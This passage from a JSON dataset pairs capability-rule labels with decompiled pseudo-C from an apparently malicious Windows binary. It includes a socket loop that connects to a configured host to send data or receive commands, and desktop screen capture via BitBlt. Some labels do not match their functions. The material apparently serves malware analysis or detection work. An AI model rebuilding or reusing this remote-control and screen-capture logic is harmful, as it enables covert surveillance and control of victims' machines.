        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00490f58\n noreturn \n          (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack1132;\n    uint uStack1128;\n    uchar *puStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint var_444h;\n    uint var_440h;\n    uint var_43ch;\n    int32_t var_438h;\n    uint var_42ch;\n    int32_t *var_2ch;\n    int32_t var_28h;\n    uint var_20h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1124 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack1112 = 0x490f8c;\n    fcn.00405f08();\n    uStack1116 = 0x4911eb;\n    uStack1120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffba0;\n    uStack1128 = 0x491185;\n    uStack1132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb94;\n    puStack1112 = &stack0xfffffffc;\n    var_2ch = fcn.0041bd84();\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.0044c34c();\n    fcn.00405504();\n    fcn.0041bea0();\n    var_28h = sub.wsock32.dll_socket(2, 1, 0);\n    if (var_28h == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    var_43ch._0_2_ = 2;\n    var_43ch._2_2_ = sub.wsock32.dll_htons(**0x4a4dbc);\n    var_438h = sub.wsock32.dll_inet_addr(**0x4a4f7c);\n    if (var_438h == -1) {\n        iVar1 = sub.wsock32.dll_gethostbyname(**0x4a4f7c);\n        if (iVar1 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread(0);\n        }\n        var_438h = ***(iVar1 + 0xc);\n    }\n    sub.wsock32.dll_connect(var_28h, &fcn.00490f58::var_43ch, 0x10);\n    iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.00490f58::var_42ch, 0x400, 0);\n    if (iVar1 != -1) {\n        fcn.00405800(var_ch, 0x49121c, var_8h, 0x491208);\n        fcn.0049393c();\n        uVar3 = 0x400;\n        iVar1 = sub.wsock32.dll_recv(var_28h, &fcn.00490f58::var_42ch, 0x400, 0);\n        if (iVar1 != -1) {\n            fcn.0041b4ac(0, 0);\n            while( true ) {\n                fcn.00403ae4();\n                iVar1 = (**(*var_2ch + 0xc))();\n                if (iVar1 < 1) break;\n                iVar2 = sub.wsock32.dll_send(uVar3, &fcn.00490f58::var_42ch, iVar1, 0);\n                if (iVar2 == -1) break;\n                iVar2 = sub.wsock32.dll_recv(var_28h, &fcn.00490f58::var_42ch, 0x400, 0);\n                if ((iVar2 == -1) || (iVar1 < 1)) break;\n            }\n        }\n    }\n    sub.wsock32.dll_shutdown(var_28h, 2);\n    sub.wsock32.dll_closesocket(var_28h);\n    fcn.00404640();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 1003
    },
    "00492348": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00492348(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    ushort uStack8248;\n    ushort uStack8246;\n    int32_t iStack8244;\n    uchar auStack8232 [3900];\n    uint uStack4332;\n    uint uStack4328;\n    uint uStack4324;\n    uint uStack4320;\n    uint uStack4316;\n    uint uStack4312;\n    uint uStack4308;\n    uint uStack4304;\n    uint uStack4300;\n    uint uStack4296;\n    uint uStack4292;\n    uint uStack4288;\n    uint uStack4284;\n    uint uStack4280;\n    uint uStack4276;\n    uint uStack4272;\n    uint uStack4268;\n    uchar *puStack4264;\n    int32_t iStack4260;\n    uchar *puStack4256;\n    uint uStack4252;\n    uint uStack4248;\n    int32_t iStack4244;\n    uchar *puStack4240;\n    uint uStack4236;\n    uint uStack4232;\n    int32_t iStack4228;\n    uchar *puStack4224;\n    uint uStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    uint32_t uStack4208;\n    uint uStack4204;\n    uint uStack4200;\n    uint uStack4196;\n    uint uStack4192;\n    uint uStack4188;\n    uchar *puStack4184;\n    uint uStack4180;\n    uint uStack4176;\n    uchar *puStack4172;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4184 = &stack0xfffffffc;\n    iVar1 = 2;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puStack4172 = 0x492380;\n    fcn.00405f08();\n    uStack4176 = 0x4926d2;\n    uStack4180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefac;\n    uStack4188 = 0x492654;\n    uStack4192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefa0;\n    uStack4196 = 0x4923ab;\n    puStack4172 = &stack0xfffffffc;\n    fcn.00408460();\n    uStack4196 = 0x4923b5;\n    fcn.00405504();\n    uStack4196 = 0;\n    uStack4200 = 1;\n    uStack4204 = 2;\n    uStack4208 = 0x4923c0;\n    iStack4260 = sub.wsock32.dll_socket();\n    if (iStack4260 == -1) {\n        uStack4208 = 0;\n    // WARNING: Subroutine does not return\n        uStack4212 = 0x4923d0;\n        sub.kernel32.dll_ExitThread();\n    }\n    uStack8248 = 2;\n    uStack4208 = **0x4a4dbc;\n    uStack4212 = 0x4923e7;\n    uStack8246 = sub.wsock32.dll_htons();\n    uStack4212 = **0x4a4f7c;\n    uStack4216 = 0x4923fb;\n    iStack8244 = sub.wsock32.dll_inet_addr();\n    if (iStack8244 == -1) {\n        uStack4216 = **0x4a4f7c;\n        uStack4220 = 0x492413;\n        iVar1 = sub.wsock32.dll_gethostbyname();\n        if (iVar1 == 0) {\n            uStack4220 = 0;\n    // WARNING: Subroutine does not return\n            puStack4224 = 0x492420;\n            sub.kernel32.dll_ExitThread();\n        }\n        iStack8244 = ***(iVar1 + 0xc);\n    }\n    uStack4220 = 0x10;\n    puStack4224 = &stack0xffffdfc8;\n    uStack4232 = 0x49243f;\n    iStack4228 = iStack4260;\n    sub.wsock32.dll_connect();\n    uStack4232 = 0;\n    uStack4236 = 0x2000;\n    puStack4240 = &stack0xffffdfd8;\n    uStack4248 = 0x492456;\n    iStack4244 = iStack4260;\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n        uStack4248 = 0;\n    // WARNING: Subroutine does not return\n        uStack4252 = 0x492460;\n        sub.kernel32.dll_ExitThread();\n    }\n    uStack4248 = 0x492473;\n    fcn.00405784();\n    uStack4248 = 0x492481;\n    fcn.0049393c();\n    uStack4248 = 0;\n    uStack4252 = 0x2000;\n    puStack4256 = &stack0xffffdfd8;\n    puStack4264 = 0x492498;\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n        puStack4264 = NULL;\n    // WARNING: Subroutine does not return\n        uStack4268 = 0x4924a2;\n        sub.kernel32.dll_ExitThread();\n    }\n    puStack4264 = 0x4924ae;\n    fcn.00404610();\n    puStack4264 = 0x4924bd;\n    fcn.00404610();\n    puStack4264 = 0x4924cc;\n    piVar2 = fcn.0042cbe0();\n    uStack4268 = 0x492570;\n    uStack4272 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef50;\n    uStack4276 = 0x4924e2;\n    puStack4264 = &stack0xfffffffc;\n    uVar3 = sub.user32.dll_GetDesktopWindow();\n    uStack4280 = 0x4924ee;\n    uStack4276 = uVar3;\n    uVar4 = sub.user32.dll_GetDC();\n    uStack4280 = 8;\n    uStack4288 = 0x4924fc;\n    uStack4284 = uVar4;\n    sub.gdi32.dll_GetDeviceCaps();\n    uStack4288 = 10;\n    uStack4296 = 0x492509;\n    uStack4292 = uVar4;\n    sub.gdi32.dll_GetDeviceCaps();\n    uStack4296 = 0x492515;\n    (**(*piVar2 + 0x40))();\n    uStack4296 = 0x49251f;\n    (**(*piVar2 + 0x34))();\n    uStack4296 = 0xcc0020;\n    uStack4300 = 0;\n    uStack4304 = 0;\n    uStack4312 = 0x492534;\n    uStack4308 = uVar4;\n    uStack4312 = (**(*piVar2 + 0x20))();\n    uStack4316 = 0x49253d;\n    uStack4316 = (**(*piVar2 + 0x2c))();\n    uStack4320 = 0;\n    uStack4324 = 0;\n    uStack4328 = 0x49254a;\n    fcn.0042d1b4();\n    uStack4328 = 0x49254f;\n    uStack4328 = fcn.00428b60();\n    uStack4332 = 0x492555;\n    sub.gdi32.dll_BitBlt();\n    *in_FS_OFFSET = uStack4328;\n    uStack4320 = 0x492577;\n    uStack4332 = 0x49256f;\n    uStack4328 = uVar3;\n    uStack4324 = uVar4;\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 1865
    },
    "00493a30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00493a30 noreturn (void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uchar auStack8224 [3988];\n    uint uStack4236;\n    uint uStack4232;\n    uint uStack4228;\n    uchar *puStack4224;\n    int32_t iStack4220;\n    uint uStack4216;\n    int32_t iStack4212;\n    uint *puStack4208;\n    uint uStack4204;\n    int32_t iStack4200;\n    uint32_t uStack4196;\n    uint uStack4188;\n    uint uStack4184;\n    uint *puStack4180;\n    int32_t iStack4176;\n    uint uStack4172;\n    uchar *puStack4168;\n    int32_t iStack4164;\n    uint uStack4160;\n    uchar *puStack4156;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4156 = &stack0xfffffffc;\n    puStack4168 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack4160 = 0x493cc5;\n    iStack4164 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefbc;\n    uStack4172 = 0x493c79;\n    iStack4176 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb0;\n    iVar4 = 0;\n    puStack4180 = 0x493a93;\n    iVar2 = fcn.0040669c();\ncode_r0x00493a95:\n    do {\n        if (iVar2 <= iVar4) {\n            iVar4 = 0;\n        }\n        puStack4180 = 0x493aae;\n        fcn.00405504();\n        puStack4180 = &fcn.00493a30::var_ch;\n        uStack4184 = 0x493abf;\n        fcn.00405a48();\n        uStack4184 = 0x493acf;\n        fcn.00405964();\n        uStack4184 = 0x493adc;\n        fcn.00405a48();\n        uStack4184 = 0x493aeb;\n        fcn.004059a4();\n        uStack4184 = 0x493af3;\n        uVar1 = fcn.00409dd8();\n        **0x4a4dbc = uVar1;\n        uStack4184 = 0x493b04;\n        iVar3 = fcn.004058fc();\n        **0x4a4f7c = iVar3;\n        iVar4 = iVar4 + 1;\n        uStack4184 = 0x493b1c;\n        fcn.00403ae4();\n        uStack4184 = 0;\n        uStack4188 = 1;\n        iStack4176 = 2;\n        uStack4196 = 0x493b27;\n        iVar3 = sub.wsock32.dll_socket();\n        **0x4a4f1c = iVar3;\n    } while (**0x4a4f1c == -1);\n    var_1ch._0_2_ = 2;\n    uStack4196 = **0x4a4dbc;\n    iStack4200 = 0x493b51;\n    var_1ch._2_2_ = sub.wsock32.dll_htons();\n    iStack4200 = **0x4a4f7c;\n    uStack4204 = 0x493b62;\n    var_18h = sub.wsock32.dll_inet_addr();\n    if (var_18h == -1) goto code_r0x00493b6a;\n    goto code_r0x00493b89;\ncode_r0x00493b6a:\n    iStack4176 = **0x4a4f7c;\n    puStack4208 = 0x493b77;\n    iVar3 = sub.wsock32.dll_gethostbyname();\n    if (iVar3 != 0) {\n        var_18h = ***(iVar3 + 0xc);\ncode_r0x00493b89:\n        uStack4204 = 0x10;\n        puStack4208 = &fcn.00493a30::var_1ch;\n        iStack4212 = **0x4a4f1c;\n        uStack4216 = 0x493b9c;\n        iVar3 = sub.wsock32.dll_connect();\n        if (iVar3 == 0) {\n            **0x4a4e70 = 1;\n            while( true ) {\n                uStack4216 = 0x493bbe;\n                fcn.00403ae4();\n                uStack4216 = 0;\n                iStack4220 = 0x2000;\n                puStack4224 = &stack0xffffdfe0;\n                iStack4212 = **0x4a4f1c;\n                uStack4232 = 0x493bd9;\n                iVar2 = sub.wsock32.dll_recv();\n                if (iVar2 < 1) break;\n                uStack4232 = 0x493bfe;\n                fcn.00405d5c();\n                uStack4232 = 0x493c0f;\n                fcn.00409acc();\n                uStack4232 = 0x493c1d;\n                fcn.004056f4();\n                uStack4232 = 0x493c33;\n                fcn.0044c628();\n                uStack4232 = 0x493c41;\n                fcn.00405504();\n                uStack4232 = 0x493c49;\n                fcn.00493dac();\n            }\n            uStack4232 = 0x493be4;\n            fcn.0049378c();\n            uStack4232 = 0;\n    // WARNING: Subroutine does not return\n            uStack4236 = 0x493beb;\n            sub.kernel32.dll_ExitThread();\n        }\n        uStack4216 = 1;\n        iStack4220 = **0x4a4f1c;\n        puStack4224 = 0x493c5d;\n        sub.wsock32.dll_shutdown();\n        iStack4176 = **0x4a4f1c;\n        uStack4228 = 0x493c6a;\n        sub.wsock32.dll_closesocket();\n    }\n    goto code_r0x00493a95;\n}\n",
        "token_count": 1527
    },
    "00404408": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00404408(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 135
    },
    "00404914": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404914(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00404960;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00404960:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 426
    },
    "00409850": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409850(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    uVar2 = param_1 ^ 0xffffffff;\n    iVar1 = in_EAX + param_1 + -8;\n    iVar5 = param_2 + param_1 + -8;\n    iVar3 = uVar2 + 9;\n    if (iVar3 == 0 || SCARRY4(uVar2, 9) != iVar3 < 0) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        uVar6 = iVar3 + iVar1 & 3;\n        iVar3 = (uVar2 + 0xd) - uVar6;\n        iVar4 = iVar3;\n        if (iVar3 == 0 || uVar2 + 0xd < uVar6) {\n            do {\n                if (*(iVar4 + iVar1) != *(iVar4 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 4 + iVar1) != *(iVar4 + 4 + iVar5)) {\n                    return 0;\n                }\n                iVar3 = iVar4 + 8;\n                if (iVar3 != 0 && SCARRY4(iVar4, 8) == iVar3 < 0) break;\n                if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 0xc + iVar1) != *(iVar4 + 0xc + iVar5)) {\n                    return 0;\n                }\n                bVar7 = SCARRY4(iVar3, 8);\n                iVar3 = iVar4 + 0x10;\n                iVar4 = iVar3;\n            } while (iVar3 == 0 || bVar7 != iVar3 < 0);\n        }\n    }\n    if (iVar3 < 5) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 4;\n    }\n    if (iVar3 < 7) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 2;\n    }\n    if ((iVar3 < 8) && (*(in_EAX + param_1 + -1) != *(param_2 + param_1 + -1))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 607
    },
    "00421fc0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.00421fc0(void)\n\n{\n    uint in_EAX;\n    \n    fcn.004054c0();\n    // switch table (8 cases) at 0x421fe2\n    switch(in_EAX) {\n    case 1:\n        fcn.004054c0();\n        return;\n    case 2:\n        fcn.004054c0();\n        return;\n    case 3:\n        fcn.004054c0();\n        return;\n    case 4:\n        fcn.004054c0();\n        return;\n    case 5:\n        fcn.004054c0();\n        return;\n    case 6:\n        fcn.004054c0();\n        break;\n    case 7:\n        fcn.004054c0();\n        return;\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00423c4c": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00423c4c(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint8_t *puVar3;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    int32_t var_4h_2;\n    int32_t var_8h_2;\n    uint var_10h_5;\n    uint var_10h_3;\n    uint var_18h;\n    uint var_1ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_8h;\n    uchar auStack180 [4];\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t iStack168;\n    uchar *puStack164;\n    uint arg_ch_01;\n    uint arg_10h;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack136;\n    int32_t iStack132;\n    uint8_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint *puStack108;\n    uint uStack104;\n    int32_t *piStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uchar auStack52 [12];\n    uint var_30h_2;\n    uint var_30h;\n    uint uStack24;\n    uchar *puStack20;\n    uchar *puStack16;\n    uint32_t uStack12;\n    uint32_t var_10h_4;\n    uint var_10h_2;\n    \n    puStack108 = &fcn.00423c4c::var_10h_2;\n    uStack12 = var_4h[1];\n    if (uStack12 != 0) {\n        puVar3 = var_4h + 3;\n        uVar2 = uStack12;\n        do {\n            uVar1 = *puVar3;\n            if ((uVar1 & 0x80) == 0) {\n                if (uVar1 == 0xc) {\n                    var_8h_2 = var_8h_2 + 0x10;\n                }\n                else {\n                    if ((uVar1 < 5) || (7 < uVar1)) goto code_r0x00423ca3;\n                    var_8h_2 = var_8h_2 + 8;\n                }\n            }\n            else {\ncode_r0x00423ca3:\n                var_8h_2 = var_8h_2 + 4;\n            }\n            puVar3 = puVar3 + 1;\n            uVar2 = uVar2 - 1;\n            unaff_ESI = var_8h_2;\n        } while (uVar2 != 0);\n    }\n    puStack128 = var_4h;\n    puStack20 = &stack0xffffffc0;\n    var_10h_4 = var_4h[2];\n    iStack132 = unaff_ESI;\n    for (uVar2 = var_10h_4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        iStack132 = var_4h_2;\n    }\n    uStack76 = *var_4h;\n    if ((uStack76 == 4) && ((var_10h_4 = var_10h_4 + 1,  var_4h[3] == 9 || (var_4h[3] == 0xd)))) {\n        uStack76 = 8;\n    }\n    puStack16 = &stack0xffffffc0;\n    uStack68 = 0;\n    puStack72 = &stack0xffffffcc;\n    puStack80 = NULL;\n    uStack84 = 0x423cf7;\n    fcn.00423c3c();\n    uStack84 = uStack76;\n    uStack76 = var_10h_5;\n    uStack88 = puStack80;\n    uStack92 = 0x4a17d0;\n    uStack96 = noname_2;\n    piStack100 = noname_0;\n    uStack104 = 0x423d13;\n    puStack80 = &stack0xffffffec;\n    arg_ch_00 = (**(*noname_0 + 0x18))();\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    puStack172 = &stack0xffffffcc;\n    uStack104 = CONCAT31(extraout_ECX >> 8, 1);\n    puStack136 = &stack0xffffff94;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack140 = 0x423c21;\n    uStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    if (arg_ch_00 == -0x7ffdfff7) {\n        puStack136 = &stack0xffffff94;\n        puStack108 = &fcn.00423c4c::var_10h_2;\n        fcn.004056f4();\n        arg_10h = uStack116;\n        fcn.004056f4();\n        puStack164 = 0x423bb4;\n        arg_ch_01 = uStack120;\n        fcn.004056f4();\n        puStack164 = 0x423bc3;\n        iStack168 = fcn.00422ef4(var_30h, arg_ch_01, arg_10h, uStack24);\n        if (piStack100 != '\\0') {\n            puStack164 = 0x423bd8;\n            fcn.00406110();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack168 = fcn.00422e20(0, arg_ch_00);\n    }\n    if (var_ch != 0) {\n        iStack176 = iStack168;\n        if (iStack168 == 0) {\n            iStack176 = fcn.00405460();\n        }\n        puStack164 = &stack0xffffffc0;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x4a6014)(0xeedfade, 1, 7, &stack0xffffff4c);\n        return;\n    }\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_10h;\n    uStack144 = 0x423c28;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1682
    },
    "0040fe94": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe94(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40feee;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.00409e2c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40fef5;\n    uStack20 = 0x40feed;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 195
    },
    "0040ff00": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff00(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40ff5a;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040b6c0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40ff61;\n    uStack20 = 0x40ff59;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 198
    },
    "0040ff6c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff6c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40ffc6;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040b694();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40ffcd;\n    uStack20 = 0x40ffc5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 196
    },
    "0040ffd8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ffd8(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410032;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040d148();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410039;\n    uStack20 = 0x410031;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 192
    },
    "00410044": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410044(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41009e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004056f4();\n        fcn.0040b6ec();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4100a5;\n    uStack20 = 0x41009d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 196
    },
    "00411d44": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00411d44(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x411de7;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00414f48();\n    uVar3 = var_4h;\n    iVar2 = (***0x4a511c)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.00409e2c();\n        if (cVar1 == '\\0') {\n            var_8h = fcn.00412fa4();\n            var_8h = var_8h & 0x7f;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041107c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x411dee);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 335
    },
    "00412748": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
